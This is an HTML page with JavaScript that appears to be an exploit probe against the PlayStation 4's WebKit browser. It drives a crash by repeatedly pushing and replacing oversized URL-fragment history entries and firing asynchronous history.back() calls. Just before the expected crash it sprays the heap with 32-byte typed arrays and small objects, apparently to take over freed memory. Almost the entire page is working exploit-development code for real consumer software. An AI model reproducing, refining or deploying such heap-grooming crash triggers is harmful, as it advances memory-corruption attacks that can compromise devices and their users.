<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit – Route 2 Heap Substitution Probe</title>
<style>
body {
    font-family: monospace;
    background: #000;
    color: #0f0;
    padding: 20px;
}
button {
    font-size: 16px;
    padding: 12px;
    margin: 10px 0;
}
#log {
    white-space: pre-wrap;
    border: 1px solid #0f0;
    padding: 10px;
    max-height: 520px;
    overflow-y: auto;
}
.warn { color: #ff0; }
.crit { color: #f00; }
</style>
</head>

<body>
<h2>PS4 WebKit – Route 2 Heap Substitution Probe</h2>

<button onclick="runRoute2()">RUN ROUTE 2 + HEAP SUBSTITUTION</button>

<div id="log"></div>

<script>
const logEl = document.getElementById("log");
function log(m, cls=""){
    const s = document.createElement("span");
    if(cls) s.className = cls;
    s.textContent = m + "\n";
    logEl.appendChild(s);
    logEl.scrollTop = logEl.scrollHeight;
}
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

const BASE = 977;
const STEP = 14461;
const ITERS = 50;

let heapSpray = [];
let buffers = [];

async function heapSubstitute(tag){
    log(`[HS] Heap substitution phase (${tag})`, "warn");

    // 32-byte class (target size)
    for(let i=0;i<2000;i++){
        buffers.push(new Uint8Array(32));
    }

    // Small JSObjects
    for(let i=0;i<1000;i++){
        heapSpray.push({ a:i, b:i+1, c:i+2 });
    }

    log(`[HS] Allocated Uint8Array(32) x ${buffers.length}`);
    log(`[HS] Allocated JSObjects x ${heapSpray.length}`);
}

async function runRoute2(){
    logEl.textContent = "";
    heapSpray = [];
    buffers = [];

    log("=== ROUTE 2 – FRAGMENT BUFFER REPLACEMENT ===", "crit");
    log("Expected crash ~ ITER 48 (history.back async)\n");

    let size = BASE;

    for(let i=0;i<ITERS;i++){
        let payload;

        // Alternating fragment pattern
        if(i >= 46){
            payload = (i % 2 === 0) ? "A".repeat(32) : "B".repeat(size);
            log(`[ITER ${i}] alternating fragment size=${payload.length}`, "warn");
        } else {
            payload = "A".repeat(size);
            log(`[ITER ${i}] size=${size}`);
        }

        history.pushState({}, "", "#"+payload);
        history.replaceState({}, "", "#"+payload);

        // Critical window
        if(i === 47){
            log("\n>>> ENTERING CRITICAL WINDOW <<<", "crit");
            await heapSubstitute("pre-back");
        }

        if(i % 6 === 0){
            setTimeout(()=>history.back(), 0);
            log("  history.back() ASYNC scheduled", "warn");
        }

        size += STEP;
        await sleep(3);
    }

    log("\n=== END (should not reach if crash occurs) ===");
}

log("Ready.");
log("This test preserves EXACT crash mechanics.");
log("Only addition: heap substitution before ITER 48.");
</script>
</body>
</html>

